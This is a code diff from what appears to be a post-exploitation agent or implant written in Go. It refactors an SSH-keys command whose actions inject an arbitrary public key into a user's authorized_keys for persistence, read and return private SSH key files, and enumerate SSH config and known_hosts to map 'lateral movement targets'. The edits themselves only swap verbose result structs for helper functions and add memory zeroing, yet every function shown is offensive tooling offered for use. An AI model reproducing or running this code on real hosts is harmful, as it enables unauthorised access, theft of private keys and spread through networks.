@@ -34,11 +34,7 @@ func (c *SSHKeysCommand) Execute(task structs.Task) structs.CommandResult {
 	var args sshKeysArgs
 
 	if task.Params == "" {
-		return structs.CommandResult{
-			Output:    "Error: parameters required. Use action: list, add, remove, read-private",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: parameters required. Use action: list, add, remove, read-private")
 	}
 
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
@@ -62,11 +58,7 @@ func (c *SSHKeysCommand) Execute(task structs.Task) structs.CommandResult {
 	case "enumerate":
 		return sshKeysEnumerate(args)
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s. Use: list, add, remove, read-private, enumerate", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s. Use: list, add, remove, read-private, enumerate", args.Action)
 	}
 }
 
@@ -91,11 +83,7 @@ func getSSHDir(targetUser string) (string, error) {
 func sshKeysList(args sshKeysArgs) structs.CommandResult {
 	sshDir, err := getSSHDir(args.User)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: %v", err)
 	}
 
 	authKeysPath := filepath.Join(sshDir, "authorized_keys")
@@ -105,12 +93,9 @@ func sshKeysList(args sshKeysArgs) structs.CommandResult {
 
 	content, err := os.ReadFile(authKeysPath)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error reading %s: %v", authKeysPath, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error reading %s: %v", authKeysPath, err)
 	}
+	defer structs.ZeroBytes(content)
 
 	output := strings.TrimSpace(string(content))
 	if output == "" {
@@ -127,39 +112,23 @@ func sshKeysList(args sshKeysArgs) structs.CommandResult {
 		}
 	}
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("Authorized keys (%s) — %d key(s):\n%s", authKeysPath, keyCount, output),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("Authorized keys (%s) — %d key(s):\n%s", authKeysPath, keyCount, output)
 }
 
 // sshKeysAdd injects a public key into authorized_keys
 func sshKeysAdd(args sshKeysArgs) structs.CommandResult {
 	if args.Key == "" {
-		return structs.CommandResult{
-			Output:    "Error: 'key' is required (the SSH public key to inject)",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: 'key' is required (the SSH public key to inject)")
 	}
 
 	sshDir, err := getSSHDir(args.User)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: %v", err)
 	}
 
 	// Create .ssh dir if it doesn't exist (0700 permissions)
 	if err := os.MkdirAll(sshDir, 0700); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error creating %s: %v", sshDir, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error creating %s: %v", sshDir, err)
 	}
 
 	authKeysPath := filepath.Join(sshDir, "authorized_keys")
@@ -173,11 +142,7 @@ func sshKeysAdd(args sshKeysArgs) structs.CommandResult {
 
 	// Check if key already exists
 	if strings.Contains(existingStr, strings.TrimSpace(args.Key)) {
-		return structs.CommandResult{
-			Output:    "Key already exists in authorized_keys",
-			Status:    "success",
-			Completed: true,
-		}
+		return successResult("Key already exists in authorized_keys")
 	}
 
 	// Append the new key
@@ -188,37 +153,21 @@ func sshKeysAdd(args sshKeysArgs) structs.CommandResult {
 	newContent += strings.TrimSpace(args.Key) + "\n"
 
 	if err := os.WriteFile(authKeysPath, []byte(newContent), 0600); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error writing %s: %v", authKeysPath, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error writing %s: %v", authKeysPath, err)
 	}
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("Injected SSH key into %s", authKeysPath),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("Injected SSH key into %s", authKeysPath)
 }
 
 // sshKeysRemove removes a key from authorized_keys
 func sshKeysRemove(args sshKeysArgs) structs.CommandResult {
 	if args.Key == "" {
-		return structs.CommandResult{
-			Output:    "Error: 'key' is required (substring to match for removal)",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: 'key' is required (substring to match for removal)")
 	}
 
 	sshDir, err := getSSHDir(args.User)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: %v", err)
 	}
 
 	authKeysPath := filepath.Join(sshDir, "authorized_keys")
@@ -228,11 +177,7 @@ func sshKeysRemove(args sshKeysArgs) structs.CommandResult {
 
 	content, err := os.ReadFile(authKeysPath)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error reading %s: %v", authKeysPath, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error reading %s: %v", authKeysPath, err)
 	}
 
 	lines := strings.Split(string(content), "\n")
@@ -247,55 +192,37 @@ func sshKeysRemove(args sshKeysArgs) structs.CommandResult {
 	}
 
 	if removedCount == 0 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("No keys matching '%s' found", args.Key),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("No keys matching '%s' found", args.Key)
 	}
 
 	newContent := strings.Join(kept, "\n")
 	if err := os.WriteFile(authKeysPath, []byte(newContent), 0600); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error writing %s: %v", authKeysPath, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error writing %s: %v", authKeysPath, err)
 	}
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("Removed %d key(s) matching '%s' from %s", removedCount, args.Key, authKeysPath),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("Removed %d key(s) matching '%s' from %s", removedCount, args.Key, authKeysPath)
 }
 
 // sshKeysReadPrivate reads SSH private key files
 func sshKeysReadPrivate(args sshKeysArgs) structs.CommandResult {
 	sshDir, err := getSSHDir(args.User)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: %v", err)
 	}
 
 	// If a specific path is given, just read that file
 	if args.Path != "" {
 		content, err := os.ReadFile(args.Path)
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error reading %s: %v", args.Path, err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error reading %s: %v", args.Path, err)
 		}
-		return structs.CommandResult{
+		result := structs.CommandResult{
 			Output:    fmt.Sprintf("=== %s ===\n%s", args.Path, string(content)),
 			Status:    "success",
 			Completed: true,
 		}
+		structs.ZeroBytes(content)
+		return result
 	}
 
 	// Enumerate and read common private key files
@@ -311,21 +238,14 @@ func sshKeysReadPrivate(args sshKeysArgs) structs.CommandResult {
 		}
 		found++
 		results = append(results, fmt.Sprintf("=== %s ===\n%s", keyPath, string(content)))
+		structs.ZeroBytes(content)
 	}
 
 	if found == 0 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("No private keys found in %s", sshDir),
-			Status:    "success",
-			Completed: true,
-		}
+		return successf("No private keys found in %s", sshDir)
 	}
 
-	return structs.CommandResult{
-		Output:    fmt.Sprintf("Found %d private key(s):\n\n%s", found, strings.Join(results, "\n\n")),
-		Status:    "success",
-		Completed: true,
-	}
+	return successf("Found %d private key(s):\n\n%s", found, strings.Join(results, "\n\n"))
 }
 
 // sshKeysEnumerate scans SSH config and known_hosts to map lateral movement targets.
@@ -334,11 +254,7 @@ func sshKeysReadPrivate(args sshKeysArgs) structs.CommandResult {
 func sshKeysEnumerate(args sshKeysArgs) structs.CommandResult {
 	sshDir, err := getSSHDir(args.User)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: %v", err)
 	}
 
 	var sb strings.Builder
@@ -438,11 +354,7 @@ func sshKeysEnumerate(args sshKeysArgs) structs.CommandResult {
 		sb.WriteString("\n[Private Keys] None found\n")
 	}
 
-	return structs.CommandResult{
-		Output:    sb.String(),
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(sb.String())
 }
 
 // sshConfigHost holds parsed SSH config entries
